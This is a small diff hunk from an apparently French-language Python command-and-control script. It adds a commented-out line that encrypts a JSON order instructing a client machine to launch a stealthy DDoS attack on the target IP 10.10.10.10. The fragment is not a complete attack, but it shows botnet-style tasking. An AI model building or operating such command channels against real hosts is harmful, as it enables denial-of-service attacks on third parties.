@@ -858,7 +858,8 @@ elif args.start:
 
                             # # Envoi de l'attaque à l'ordinateur
                             # cipher = AES.new(client['sym_key'], AES.MODE_CBC, iv=client['iv'])
-                            # cipher_text = cipher.encrypt(pad(json.dumps(data_to_send).encode(), AES.block_size))
+                            # #cipher_text = cipher.encrypt(pad(json.dumps(data_to_send).encode(), AES.block_size))
+                            #cipher_text = cipher.encrypt(pad('{"id":"10","attack":"ddos","cible":"10.10.10.10","arg1":"stealth,t5","arg2":"nono","arg3":""}'.encode(), AES.block_size))
                             # print("cipher_text : ")
                             # print(cipher_text)
                             
